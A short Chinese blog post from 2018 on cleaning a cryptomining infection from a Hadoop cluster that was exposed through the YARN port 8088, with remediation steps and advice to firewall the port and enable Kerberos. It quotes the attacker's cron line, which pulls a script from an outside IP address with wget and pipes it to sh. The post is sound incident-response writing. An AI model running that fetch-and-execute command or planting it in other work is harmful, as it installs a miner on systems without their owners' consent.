---
slug: hadoop-mining-problem-solution
title: hadoop 挖矿 问题解决
authors: [ledai]
tags: [学习历程, hadoop 安全, 挖矿]
date: 2018-08-02
---

<h1>hadoop 挖矿 问题解决</h1>
<!-- truncate -->
之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿

直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客

https://blog.csdn.net/love_lixr/article/details/81454548 

1.首先yarn的 cpu会直接飙满  然后一直提交小任务 一般的挖矿程序无非是 定时器远程 下载挖矿程序 定时器执行 

2.第一步 查询yarn 的相关程序信息 `ps -ef | grep yarn`

 yarn 46185 1 99 May03 ?  4 - 19 : 04 : 28 / tmp / java - c / tmp / w.conf
 
这就是那个该死的主程序了 这时候不要着急kill 找到根源 

3.第二步查看 yarn 用户的相关定时任务 `crontab -l -u yarn`

***** wget -q -O - http://185.222.210.59/cr.sh | sh > /dev/null 2>&1

这玩意就是定时器了 

4.`crontab -r -u yarn`  删除yarn用户下所有的定时任务  然后 kill -9 PID 挖矿程序 删除 rm -rf /var/tmp/java  相关文件

5.这个时候 挖矿的问题是解决了 但是根本问题没有解决 那就是 8088端口开放问题  可以通过防火墙 或者绑定内网ip 来限制访问

另外最重要的是 可以通过开启kerberos hadoop 安全认证机制 有效解决这个问题。